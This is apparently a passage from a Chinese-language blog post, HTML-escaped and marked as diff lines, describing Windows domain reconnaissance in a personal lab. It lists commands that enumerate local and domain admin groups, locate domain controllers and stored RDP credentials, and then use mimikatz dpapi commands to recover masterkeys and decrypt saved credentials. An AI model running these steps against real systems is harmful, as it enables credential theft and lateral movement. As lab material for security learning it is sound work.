-&lt;h4 id=&#34;查看最近打开的文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看最近打开的文档&#34;&gt;#&lt;/a&gt; 查看最近打开的文档&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;dir %APPDATA%\Microsoft\Windows\Recent
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201310126.png&#34; alt=&#34;image-20221223201310126&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看本地用户组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看本地用户组&#34;&gt;#&lt;/a&gt; 查看本地用户组&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net localgroup
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201733749.png&#34; alt=&#34;image-20221223201733749&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看组中成员&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看组中成员&#34;&gt;#&lt;/a&gt; 查看组中成员&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net localgroup administrators
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201901678.png&#34; alt=&#34;image-20221223201901678&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;当电脑加入一个域后，在本地管理员组中有两个默认的管理员，一个是 administrator，一个是域里面的 domain adminis 组。&lt;/p&gt;
-&lt;h3 id=&#34;域内信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域内信息收集&#34;&gt;#&lt;/a&gt; 域内信息收集&lt;/h3&gt;
-&lt;h4 id=&#34;判断是否存在域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断是否存在域&#34;&gt;#&lt;/a&gt; 判断是否存在域&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;ipconfig /all
-systeminfo
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;二者都可，前者目光聚焦于 DNS，后者信息很明显&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203436386.png&#34; alt=&#34;image-20221223203436386&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203404441.png&#34; alt=&#34;image-20221223203404441&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看域内上的组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看域内上的组&#34;&gt;#&lt;/a&gt; 查看域内上的组&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net group /domain
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203948352.png&#34; alt=&#34;image-20221223203948352&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看组上的详细成员&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看组上的详细成员&#34;&gt;#&lt;/a&gt; 查看组上的详细成员&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;net group &amp;quot;domain adminis&amp;quot; /domain
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204207707.png&#34; alt=&#34;image-20221223204207707&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;找域控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找域控&#34;&gt;#&lt;/a&gt; 找域控&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;nltest /DCLIST:liuqi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204720630.png&#34; alt=&#34;image-20221223204720630&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;使用这个工具可以找密码&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223204806995.png&#34; alt=&#34;image-20221223204806995&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;查看远程桌面的凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看远程桌面的凭证&#34;&gt;#&lt;/a&gt; 查看远程桌面的凭证&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;cmdkey list
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205107289.png&#34; alt=&#34;image-20221223205107289&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;我这里没有，登录一下，为后续继续实验铺垫&lt;/p&gt;
-&lt;h4 id=&#34;查看凭证文件的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看凭证文件的位置&#34;&gt;#&lt;/a&gt; 查看凭证文件的位置&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;dir /a %userprofile%\appdata\local\microsoft\credentials\*
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205359052.png&#34; alt=&#34;image-20221223205359052&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;破解凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解凭证&#34;&gt;#&lt;/a&gt; 破解凭证&lt;/h4&gt;
-&lt;h5 id=&#34;获取guid&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取guid&#34;&gt;#&lt;/a&gt; 获取 guid&lt;/h5&gt;
-&lt;pre&gt;&lt;code&gt;mimikatz dpapi::cred /in:凭证路径
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205642671.png&#34; alt=&#34;image-20221223205642671&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;找到guid对应的key&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找到guid对应的key&#34;&gt;#&lt;/a&gt; 找到 guid 对应的 key&lt;/h5&gt;
-&lt;pre&gt;&lt;code&gt;mimikatz sekurlsa::dpapi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223205835271.png&#34; alt=&#34;image-20221223205835271&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;解密凭证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解密凭证&#34;&gt;#&lt;/a&gt; 解密凭证&lt;/h5&gt;
-&lt;pre&gt;&lt;code&gt;mimikatz dpapi::cred /in:凭证的文件路径 /masterkey:masterkey的值
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223210136351.png&#34; alt=&#34;image-20221223210136351&#34; /&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
